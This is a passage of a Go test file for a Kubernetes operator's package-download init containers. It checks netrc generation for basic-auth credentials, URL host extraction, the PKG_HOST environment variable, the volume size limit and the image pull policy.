	p := onePackage("https://example.com/x.zip", "/p/x")
	p.Source.Auth = &v1alpha1.PackageAuthSpec{
		BasicAuth: &v1alpha1.PackageBasicAuthRef{
			SecretRef: v1alpha1.PackageBasicAuthSelector{
				Name: "bs", UsernameKey: "u", PasswordKey: "p",
			},
		},
	}
	script := buildPackageDownloadScript(p, 0)

	// Must use the constant '%s\n' format with the netrc line as a single arg.
	if !strings.Contains(script, `printf '%s\n' "machine $PKG_HOST login $BASIC_AUTH_USER password $BASIC_AUTH_PASS"`) {
		t.Errorf("netrc must be emitted via `printf '%%s\\n' \"...\"` with a single arg:\n%s", script)
	}

	// Must NOT use the older multi-%s pattern (defense against regressions).
	if strings.Contains(script, "machine %s login %s password %s") {
		t.Errorf("script uses multi-%%s netrc format; secret bytes could land in format string after a refactor:\n%s", script)
	}

	// Must NOT shell out to sed for host extraction (older brittle pattern).
	if strings.Contains(script, "sed ") {
		t.Errorf("script uses sed for host extraction; should pass PKG_HOST via env var:\n%s", script)
	}
}

// Security: the host extracted in Go must match url.Parse semantics —
// not a regex hack — so URLs with embedded auth, ports, or fragments
// don't produce nonsense netrc machine lines.
func TestPackageURLHost(t *testing.T) {
	cases := []struct {
		in, want string
	}{
		{"https://example.com/x.zip", "example.com"},
		{"https://example.com:8443/x.zip", "example.com:8443"},
		{"https://example.com/x.zip?token=abc", "example.com"},
		{"https://example.com/x.zip#frag", "example.com"},
		{"http://example.com/x.zip", "example.com"},
		// Pathological inputs the URL pattern allows but Go can still parse:
		{"https://example.com:8080/x.zip", "example.com:8080"},
	}
	for _, c := range cases {
		if got := packageURLHost(c.in); got != c.want {
			t.Errorf("packageURLHost(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// PKG_HOST env var is only set when basic-auth is configured — we don't
// need it for bearer-only or unauthenticated packages.
func TestBuildPackageInitEnv_PkgHostOnlyForBasicAuth(t *testing.T) {
	hasPkgHost := func(envs []corev1.EnvVar) bool {
		for _, e := range envs {
			if e.Name == "PKG_HOST" {
				return true
			}
		}
		return false
	}

	plain := onePackage("https://a.example/x.zip", "/p/a")
	if hasPkgHost(buildPackageInitEnv(plain)) {
		t.Error("PKG_HOST should not be set when no auth is configured")
	}

	bearer := onePackage("https://a.example/x.zip", "/p/a")
	bearer.Source.Auth = &v1alpha1.PackageAuthSpec{
		BearerToken: &v1alpha1.PackageSecretKeyRef{
			SecretRef: v1alpha1.PackageSecretKeySelector{Name: "ts", Key: "token"},
		},
	}
	if hasPkgHost(buildPackageInitEnv(bearer)) {
		t.Error("PKG_HOST should not be set when only bearer auth is configured")
	}

	basic := onePackage("https://a.example:8443/x.zip", "/p/a")
	basic.Source.Auth = &v1alpha1.PackageAuthSpec{
		BasicAuth: &v1alpha1.PackageBasicAuthRef{
			SecretRef: v1alpha1.PackageBasicAuthSelector{
				Name: "bs", UsernameKey: "u", PasswordKey: "p",
			},
		},
	}
	envs := buildPackageInitEnv(basic)
	var pkgHost string
	for _, e := range envs {
		if e.Name == "PKG_HOST" {
			pkgHost = e.Value
		}
	}
	if pkgHost != "a.example:8443" {
		t.Errorf("PKG_HOST = %q, want %q", pkgHost, "a.example:8443")
	}
}

// Sanity: emptyDir size limit matches the documented value (256Mi).
func TestPackageVolumeSizeLimit(t *testing.T) {
	pkgs := []v1alpha1.PackageSpec{onePackage("https://a.example/x.zip", "/p/a")}
	v := buildPackageVolumes(pkgs)[0]
	want := "256Mi"
	if v.EmptyDir.SizeLimit == nil || v.EmptyDir.SizeLimit.String() != want {
		t.Errorf("sizeLimit = %v, want %s", v.EmptyDir.SizeLimit, want)
	}
}

// Defensive: init container has no per-container ImagePullSecrets — pulls
// inherit from the pod spec's existing Curity image-pull-secret config.
func TestBuildPackageInitContainers_NoExtraImagePullSecrets(t *testing.T) {
	pkgs := []v1alpha1.PackageSpec{onePackage("https://a.example/x.zip", "/p/a")}
	cs := buildPackageInitContainers(pkgs, DefaultPackageFetcherImage)
	for i, c := range cs {
		// Container struct doesn't have ImagePullSecrets — that's pod-level.
		// Just ensure the container's Image is set and non-empty.
		if c.Image == "" {
			t.Errorf("init container[%d] has empty image", i)
		}
		if c.ImagePullPolicy != corev1.PullIfNotPresent {
			t.Errorf("init container[%d] PullPolicy = %v, want IfNotPresent", i, c.ImagePullPolicy)
		}
	}
}
